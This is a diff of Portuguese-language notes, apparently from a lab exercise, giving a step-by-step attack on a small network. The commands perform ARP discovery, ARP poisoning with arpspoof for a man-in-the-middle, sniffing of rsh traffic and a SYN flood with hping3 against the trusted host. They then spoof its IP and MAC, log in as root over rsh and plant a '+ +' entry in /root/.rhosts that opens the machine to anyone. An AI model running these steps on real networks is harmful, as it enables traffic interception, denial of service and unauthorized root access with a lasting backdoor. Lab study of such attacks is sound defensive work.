@@ -1,47 +1,52 @@
-atacker: para obter enderecos do server e trusted, vamos usar tcpdump pra monitorar o trafego entre server e trusted
+atacker: para obter enderecos do xterm e server, vamos usar tcpdump pra monitorar o trafego entre xterm e server
 tcpdump -x -i eth0 arp
 
 
 como as entradas da cache arp expiram após alguns minutos, realizar uma comunicação via ip eventualmente irá resultar em um arp request
 e como estamos monitorando a rede poderemos saber o ip de quem fez o request, seu mac e o ip de quem ele quer saber o mac
 
-trusted: pingar server pra causar um arp request
-ping server
+server: pingar xterm pra causar um arp request
+ping xterm
 
-server: pingar trusted para causar um arp request
-ping trusted
+xterm: pingar server para causar um arp request
+ping server
 
 
 da pra simular o cache expiry com arp -d [ip]
 
 attacker: agora que sabemos os macs e ips de quem está na nossa rede, vamos adicioná-los a nossa propria cache
-arp -s [ip de trusted] [mac de trusted]
 arp -s [ip de server] [mac de server]
+arp -s [ip de xterm] [mac de xterm]
 
 attacker: agora somos capazes de evenenar as tabelas de cada uma dessas máquinas para implementarmos o ataque man-in-the-middle
 para isso vamos envenenar os dois lados da conexao
-arpspoof -i eth0 -t trusted server > /dev/null 2>&1 &
-arpspoof -i eth0 -t server trusted > /dev/null 2>&1 &
+arpspoof -i eth0 -t server xterm > /dev/null 2>&1 &
+arpspoof -i eth0 -t xterm server > /dev/null 2>&1 &
 
-com isso toda a comunicação que deveria ocorrer entre server e trusted passará também por attacker
+com isso toda a comunicação que deveria ocorrer entre xterm e server passará também por attacker
 
 
 attacker: agora começamos a monitorar os pacotes que passam de um lado para o outro, dessa vez vamos analisar os pacotes como ascii para
 ver se alguma informação interessante trafega
 
-tcpdump -X -i eth0 host [ip de trusted]
+tcpdump -X -i eth0 host [ip de server]
 
 attacker: com isso notamos que há comunicação rsh ocorrendo entre as duas maquinas, logo é possível que haja uma relação de confiança entre as duas
-analisando os dados que passam, identificamos que root@server confia em trusted
+analisando os dados que passam, identificamos que root@xterm confia em server
 então iremos nos personificar como uma das máquinas confiáveis e invadir o sistema alheio!
 
-# dos em trusted???????????
+agora entra a parte em que devemos matar server para que xterm nao tente se comunicar com ele e resetar as nossas tentativas de conexao de attacker com xterm
+hping3 --flood --rand-source -S server
 
-attacker: vamos spoofar nosso ip para trusted
-ifconfig eth0 [ip de trusted]
+agora server nao vai conseguir realizar tcphanshake nunca
 
-attacker: agora somos vistos como trusted, então vamo invadir server
-rsh root@server
+
+attacker: vamos spoofar nosso ip para server
+ifconfig eth0 [ip de server]
+ifconfig eth0 hw ether [MAC]
+
+attacker: agora somos vistos como server, então vamo invadir xterm
+rsh root@xterm
 
 attacker: agora que estamos dentro (e com privilegios), vamos escancarar a máquina pra qualquer um que deseje entrar rsrsrs
 echo + + >> /root/.rhosts
